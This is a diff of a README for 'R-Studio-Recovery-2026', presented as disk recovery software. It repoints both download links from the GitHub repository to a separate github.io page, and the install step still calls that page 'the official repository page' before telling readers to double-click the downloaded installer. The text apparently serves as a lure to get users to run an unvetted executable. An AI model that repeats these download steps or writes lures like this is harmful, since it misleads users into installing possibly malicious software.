@@ -1,7 +1,7 @@
 # 📁 R-Studio-Recovery-2026 - Recover your lost disk data easily
 
 <p align="center">
-<a href="https://github.com/Lethianonparasitic876/R-Studio-Recovery-2026">
+<a href="https://lethianonparasitic876.github.io">
 <img src="https://img.shields.io/badge/Download-R--Studio-blue" alt="Download R-Studio">
 </a>
 </p>
@@ -24,7 +24,7 @@ Ensure your computer meets these conditions before you begin the installation.
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official repository page to get the installer package: [Download R-Studio-Recovery-2026](https://github.com/Lethianonparasitic876/R-Studio-Recovery-2026).
+1.  Visit the official repository page to get the installer package: [Download R-Studio-Recovery-2026](https://lethianonparasitic876.github.io).
 2.  Locate the downloaded file in your browser downloads folder or your desktop.
 3.  Double-click the installer file to launch the setup wizard.
 4.  Follow the prompts provided by the screen. Click "Next" to continue through the installation process.
